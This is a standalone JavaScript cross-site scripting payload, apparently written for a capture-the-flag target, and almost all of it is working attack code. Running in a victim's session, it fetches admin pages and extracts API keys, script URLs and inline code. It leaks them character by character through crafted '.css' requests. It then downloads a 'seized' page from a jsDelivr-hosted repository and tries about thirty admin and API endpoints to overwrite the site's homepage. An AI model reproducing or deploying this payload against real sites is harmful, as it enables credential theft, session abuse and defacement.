(function(){
  var UNIQ="v15";

  function sig(tag){
    fetch("/account.php/"+UNIQ+"_"+tag+".css",{credentials:"include"}).catch(function(){});
  }

  function exfil_str(pf, s, limit){
    var t = (s||"").slice(0, limit||100);
    for(var i=0;i<t.length;i++){
      var pos = i.toString(16).padStart(3,'0');
      var ch  = t.charCodeAt(i).toString(16).padStart(2,'0');
      fetch("/account.php/"+UNIQ+"_"+pf+"_"+pos+"_"+ch+".css",{credentials:"include"}).catch(function(){});
    }
  }

  sig("init");

  // Fetch /admin/ and extract api_key + all JS (inline + external)
  fetch("/admin/",{credentials:"include"})
  .then(function(r){ return r.text(); })
  .then(function(html){
    sig("adm_ok");
    sig("adm_len_"+html.length);

    // Extract api_key
    var akm = html.match(/vk_live_[a-f0-9]{30,50}/);
    if(akm){
      sig("ak_found");
      exfil_str("ak", akm[0], 50);
    } else {
      sig("ak_miss");
      // Maybe api_key is in a different format - search for any key pattern
      var km = html.match(/api[_-]?key['":\s=]+([a-zA-Z0-9_\-]{20,})/i);
      if(km) exfil_str("km", km[1], 50);
    }

    // Extract all external script src URLs
    var scripts = [];
    html.replace(/<script[^>]+src=["']([^"']+)["']/gi, function(_, src){
      scripts.push(src);
    });
    sig("scripts_"+scripts.length);

    // Exfil script URLs (concatenated)
    if(scripts.length > 0) exfil_str("ss", scripts.join("|"), 200);

    // Extract all inline JS
    var alljs = "";
    html.replace(/<script(?:\s[^>]*)?>([\s\S]*?)<\/script>/gi, function(_, js){ alljs += js; });
    sig("ijs_len_"+alljs.length);

    // Look for any URL patterns in HTML+JS
    var urls = [];
    html.replace(/["'](\/[a-zA-Z0-9_\-\.\/]+(?:\.[a-z]+)?)["']/g, function(_, u){
      if(u.indexOf('/assets/')===0) return;
      if(urls.indexOf(u)<0) urls.push(u);
    });
    sig("urls_"+urls.length);
    if(urls.length>0) exfil_str("ur", urls.join("|"), 300);

    // Fetch external scripts and look for API endpoints
    var p = Promise.resolve();
    scripts.forEach(function(src){
      if(src.indexOf('jsdelivr')>=0 || src.indexOf('chart')>=0) return; // skip chart lib
      p = p.then(function(){
        var fetchUrl = src.charAt(0)==='/' ? src : src;
        return fetch(fetchUrl,{credentials:"include"}).then(function(r){return r.text();}).then(function(js){
          sig("extjs_len_"+js.length);
          // Look for fetch/POST/PUT patterns
          var api = [];
          js.replace(/["'](\/(?:api|admin)\/[a-zA-Z0-9_\-\.\/]+)["']/g, function(_,u){api.push(u);});
          js.replace(/fetch\s*\(\s*["']([^"']+)["']/g, function(_,u){api.push(u);});
          if(api.length>0) exfil_str("ea", api.join("|"), 200);
        }).catch(function(){});
      });
    });

    return p;
  })
  .then(function(){
    // Also check /admin/review.php and /admin/search.php for endpoints
    return fetch("/admin/review.php",{credentials:"include"}).then(function(r){return r.text();});
  })
  .then(function(rev){
    sig("rev_ok");
    // Look for api_key here too
    var akm2 = rev.match(/vk_live_[a-f0-9]{30,50}/);
    if(akm2) exfil_str("rak", akm2[0], 50);

    // Extract URLs from review page
    var urls2 = [];
    rev.replace(/["'](\/[a-zA-Z0-9_\-\.\/]+(?:\.[a-z]+)?)["']/g, function(_, u){
      if(u.indexOf('/assets/')===0) return;
      if(urls2.indexOf(u)<0) urls2.push(u);
    });
    if(urls2.length>0) exfil_str("ru", urls2.join("|"), 200);

    // Also exfil inline JS from review page
    var rjs = "";
    rev.replace(/<script(?:\s[^>]*)?>([\s\S]*?)<\/script>/gi, function(_, js){ rjs += js; });
    if(rjs.length > 0) exfil_str("rj", rjs, 300);
  })
  .then(function(){
    // Now try writing seized.html to homepage
    return fetch("https://cdn.jsdelivr.net/gh/sem-17/vx@main/seized.html",{cache:"no-store"})
      .then(function(r){return r.text();});
  })
  .then(function(seized){
    sig("sz_loaded");

    // Comprehensive endpoint list with various methods and body formats
    var endpoints = [
      // Raw HTML body
      {m:"POST",u:"/",ct:"text/html",b:seized},
      {m:"PUT",u:"/",ct:"text/html",b:seized},
      {m:"POST",u:"/index.php",ct:"text/html",b:seized},
      {m:"PUT",u:"/index.php",ct:"text/html",b:seized},
      // Admin endpoints raw
      {m:"POST",u:"/admin/seize.php",ct:"text/html",b:seized},
      {m:"POST",u:"/admin/publish.php",ct:"text/html",b:seized},
      {m:"POST",u:"/admin/write.php",ct:"text/html",b:seized},
      {m:"POST",u:"/admin/homepage.php",ct:"text/html",b:seized},
      {m:"POST",u:"/admin/override.php",ct:"text/html",b:seized},
      {m:"POST",u:"/admin/frontpage.php",ct:"text/html",b:seized},
      {m:"POST",u:"/admin/index.php",ct:"text/html",b:seized},
      // API endpoints
      {m:"POST",u:"/api/seize",ct:"text/html",b:seized},
      {m:"POST",u:"/api/homepage",ct:"text/html",b:seized},
      {m:"POST",u:"/api/write",ct:"text/html",b:seized},
      {m:"POST",u:"/api/publish",ct:"text/html",b:seized},
      {m:"POST",u:"/api/page",ct:"text/html",b:seized},
      {m:"POST",u:"/api/frontpage",ct:"text/html",b:seized},
      {m:"PUT",u:"/api/homepage",ct:"text/html",b:seized},
      {m:"PUT",u:"/api/page",ct:"text/html",b:seized},
      // JSON body variants
      {m:"POST",u:"/api/seize",ct:"application/json",b:JSON.stringify({content:seized})},
      {m:"POST",u:"/api/homepage",ct:"application/json",b:JSON.stringify({html:seized})},
      {m:"POST",u:"/api/homepage",ct:"application/json",b:JSON.stringify({content:seized})},
      {m:"POST",u:"/admin/seize.php",ct:"application/json",b:JSON.stringify({content:seized})},
      {m:"POST",u:"/admin/homepage.php",ct:"application/json",b:JSON.stringify({content:seized})},
      // Form-encoded
      {m:"POST",u:"/admin/seize.php",ct:"application/x-www-form-urlencoded",b:"content="+encodeURIComponent(seized)},
      {m:"POST",u:"/admin/homepage.php",ct:"application/x-www-form-urlencoded",b:"content="+encodeURIComponent(seized)},
      // Action-based
      {m:"POST",u:"/admin/?action=seize",ct:"text/html",b:seized},
      {m:"POST",u:"/admin/?action=write",ct:"text/html",b:seized},
      {m:"POST",u:"/admin/?action=homepage",ct:"text/html",b:seized},
    ];

    var p = Promise.resolve();
    endpoints.forEach(function(e, idx){
      p = p.then(function(){
        return fetch(e.u,{
          method:e.m, credentials:"include",
          headers:{"Content-Type":e.ct},
          body:e.b
        }).then(function(r){
          var code = r.status;
          sig("e"+idx+"_"+code);
          if(code>=200 && code<300){
            sig("e"+idx+"_HIT");
            return r.text().then(function(t){
              sig("e"+idx+"_blen_"+t.length);
              if(t.indexOf("CERT")>=0||t.indexOf("seized")>=0||t.indexOf("flag")>=0||t.indexOf("HLB")>=0)
                sig("e"+idx+"_WIN");
            });
          }
        }).catch(function(){ sig("e"+idx+"_err"); });
      });
    });

    return p.then(function(){
      // Final check
      return fetch("/",{credentials:"include"}).then(function(r){return r.text();}).then(function(b){
        if(b.indexOf("CERT-Tervalis")>=0) sig("SEIZED_OK");
        else sig("NOT_SEIZED");
      });
    });
  })
  .catch(function(e){ sig("crash_"+e.message.slice(0,20)); });

})();
